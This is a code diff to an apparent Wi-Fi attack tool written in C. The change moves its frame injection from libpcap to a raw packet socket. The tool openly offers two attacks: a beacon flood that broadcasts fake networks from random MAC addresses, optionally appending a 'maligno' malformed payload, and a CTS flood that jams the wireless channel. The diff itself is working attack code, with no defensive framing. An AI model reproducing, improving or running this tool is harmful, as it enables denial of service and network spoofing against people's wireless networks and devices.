@@ -4,10 +4,14 @@
 #include <fcntl.h>
 #include <string.h>
 #include <stdint.h>
-#include <pcap/pcap.h>
+#include <sys/socket.h>
 #include <time.h>
 #include <linux/if_ether.h>
 #include <ctype.h>
+#include <arpa/inet.h>
+#include <net/if.h>
+#include <sys/ioctl.h>
+#include <linux/if_packet.h>
 
 struct __attribute__ ((__packed__)) radiotap {
 	uint8_t revision;
@@ -143,7 +147,7 @@ static inline void randaddr(uint8_t *addr)
 	addr[5] = rand();
 }
 
-static void beaconize(pcap_t *pcap, char *words[], int lines)
+static void beaconize(int sock, char *words[], int lines)
 {
 	struct beacon template = {
 		.radiotap.length = htole16(sizeof(struct radiotap)),
@@ -175,14 +179,14 @@ static void beaconize(pcap_t *pcap, char *words[], int lines)
 		*template.wifi.bssid = *template.wifi.saddr;
 		strcpy(template.essid_data, word);
 		if(!male) {
-			if(!pcap_inject(pcap, &template, sizeof(template) - sizeof(template.essid_data) + template.essid.length))
+			if(!write(sock, &template, sizeof(template) - sizeof(template.essid_data) + template.essid.length))
 				exit(0);
 		} else {
 			int size = sizeof(template) - sizeof(template.essid_data) + template.essid.length;
 			char buffer[size + sizeof(maligno)];
 			memcpy(buffer, &template, size);
 			memcpy(buffer + size, maligno, sizeof(maligno));
-			if(!pcap_inject(pcap, buffer, sizeof(buffer)))
+			if(!write(sock, buffer, sizeof(buffer)))
 				exit(0);
 		}
 
@@ -194,7 +198,7 @@ static void beaconize(pcap_t *pcap, char *words[], int lines)
 	}
 }
 
-static void ctsize(pcap_t *pcap)
+static void ctsize(int sock)
 {
 	struct cts cts = {
 		.radiotap.length = htole16(sizeof(struct radiotap)),
@@ -203,7 +207,7 @@ static void ctsize(pcap_t *pcap)
 	};
 	while(packets) {
 		randaddr(cts.raddr);
-		if(!pcap_inject(pcap, &cts, sizeof(cts)))
+		if(!write(sock, &cts, sizeof(cts)))
 			exit(0);
 
 		if(delay)
@@ -217,14 +221,15 @@ static void ctsize(pcap_t *pcap)
 int main(int argc, char *argv[])
 {
 	char c;
-	pcap_t *pcap;
+	int sock;
 	int lines = 0;
-	char **words;
+	char **words = NULL;
 	enum attack attack = INVALID;
 
 	while((c = getopt(argc, argv, "bcf:i:p:m")) != -1) {
 		switch(c) {
 		case 'f':
+			srand(time(NULL));
 			words = load_words(optarg, &lines);
 			printf("Loaded %d words\n", lines);
 			break;
@@ -253,24 +258,35 @@ int main(int argc, char *argv[])
 		fprintf(stderr, "-p packets	send `packet' packets, then exit\n");
 		return 1;
 	} else {
-		char errbuf[PCAP_ERRBUF_SIZE];
-		pcap = pcap_open_live(argv[optind], 96, 0, 0, errbuf);
-		if(!pcap) {
-			perror("pcap_create");
+		struct ifreq ifr;
+		sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+		if(sock == -1) {
+			perror("socket");
 			return 1;
 		}
-		srand(time(NULL));
+		strcpy(ifr.ifr_name, argv[optind]);
+		if (ioctl(sock, SIOCGIFINDEX, &ifr) == -1) {
+			perror("SIOCGIFINDEX");
+			return 1;
+		}
+		struct sockaddr_ll sa = {
+			.sll_family = AF_PACKET,
+			.sll_protocol = htons(ETH_P_ALL),
+			.sll_ifindex = ifr.ifr_ifindex,
+			.sll_pkttype = PACKET_HOST
+		};
+		bind(sock, (struct sockaddr *)&sa, sizeof(sa));
 	}
 
 	/* inject */
 	switch(attack) {
 	case BEACON:
 		printf("beaconing on %s...\n", argv[optind]);
-		beaconize(pcap, words, lines);
+		beaconize(sock, words, lines);
 		break;
 	case CTS:
 		printf("CTSing on %s...\n", argv[optind]);
-		ctsize(pcap);
+		ctsize(sock);
 		break;
 	default:
 		fprintf(stderr, "unknown attack type\n");
